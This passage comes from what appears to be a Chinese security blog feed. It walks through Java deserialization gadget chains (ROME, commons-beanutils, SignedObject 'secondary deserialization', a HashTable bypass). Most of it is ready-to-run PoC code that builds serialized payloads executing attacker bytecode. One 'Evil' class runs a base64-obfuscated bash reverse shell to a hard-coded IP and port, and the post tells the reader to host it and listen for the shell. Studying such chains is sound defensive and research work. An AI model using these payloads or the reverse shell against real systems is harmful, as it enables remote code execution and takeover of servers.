class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vps上的恶意类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打成jar包 放在http服务等待获取</p><p>vps同时监听反弹shell端口即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>二次反序列化</title>
      <link href="/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h2><p>首先利用到的是<code>java.security</code> 这个包</p><p><code>java.security</code> 包是 Java 平台中用于提供安全框架和各种安全功能的核心包。它包含了用于管理和实现安全性相关的类和接口，例如加密、数字签名、密钥管理、访问控制、认证和权限等。这个包中的类广泛用于保护数据和应用程序的安全性。</p><p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过<strong>黑名单的限制或不出网利用</strong></p><h2 id="利用连"><a href="#利用连" class="headerlink" title="利用连"></a>利用连</h2><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>在<code>java.security.SignedObject</code>这个类中, 构造器将传入的可序列化对象进行了一次序列化</p><p><code>getObject</code>方法又对构造器序列化后的对象(<code>this.content</code>)进行了反序列化 如下图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821142310512.png" alt="image-20240821142310512"></p><p>而这个<code>getObject</code>很明显就是一个getter, 那么就可以配合之前的Rome链, CB1链来调用</p><p>根据它的构造器. 利用下面这种方式来创建实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意对象,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合rome链"><a href="#结合rome链" class="headerlink" title="结合rome链"></a>结合rome链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合commons-beanutils链"><a href="#结合commons-beanutils链" class="headerlink" title="结合commons-beanutils链"></a>结合commons-beanutils链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;signedObject, <span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(priorityQueue);</span><br><span class="line"></span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里getEvilObj可以是任何一条完整的反序列化链条,只要有对应的依赖即可</p><p>当然也可以使用CC来调用getObject方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之ROME反序列化</title>
      <link href="/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是ROME"><a href="#什么是ROME" class="headerlink" title="什么是ROME"></a>什么是ROME</h2><p>简单来说, ROME工具库实现Java对象和XML数据之间的转换</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>依然使用 jdk8u65</p><p>rome依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ROME反序列化使用动态字节码加载也就是我们熟悉的TemplatesImpl这个类来组成gadget</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>在CB1链中已经知道了TemplatesImpl#getOutputProperties这个getter方法会触发newITransformer方法导致类加载, 实际上这里也是同样的原理, 不同的只是谁来调用这个getter</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820183813233.png" alt="image-20240820183813233"></p><p>这里的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br></pre></td></tr></table></figure><p>用来获取一个类的getter, 之后的for循环对这些getter进行了调用. 虽然这个方法是private, 但它的一个重载无参public方法对其进行了调用</p><p>那么接下来就是寻找toString在哪里调用了</p><p>ROME中有一个EqualsBean类它的hashcode方法间接调用了toString方法, 且这里的<code>_obj</code>可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820185015385.png" alt="image-20240820185015385"></p><p>之后套上hashMap的hashcode方法, 链子就完整了</p><p>那么就可以编写poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p><code>ObjectBean</code>的hashCode方法直接调用了<code>_equalsBean.hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下它的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;</span><br><span class="line">    _equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass,obj);</span><br><span class="line">    _toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass,obj);</span><br><span class="line">    _cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj,ignoreProperties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接创建了一个<code>EqualsBean</code>, 那么这个类就可以替换掉刚刚手动创建的的<code>EqualsBean</code></p><p>链子如下:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820202630402.png" alt="image-20240820202630402"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>针对<code>HashMap</code>的过滤可以使用<code>HashTable</code>来绕过</p><p>在<code>HashTabl</code>e的<code>readObject</code>方法中对每一个<code>key</code>都进行了<code>reconstitutionPut</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203751670.png" alt="image-20240820203751670"></p><p>跟进发现调用了<code>key.hashCode()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203823164.png" alt="image-20240820203823164"></p><p>直接把Hashmap改成HashTable即可</p><p>poc:</p><figure class="highlight java"><table><tr><td 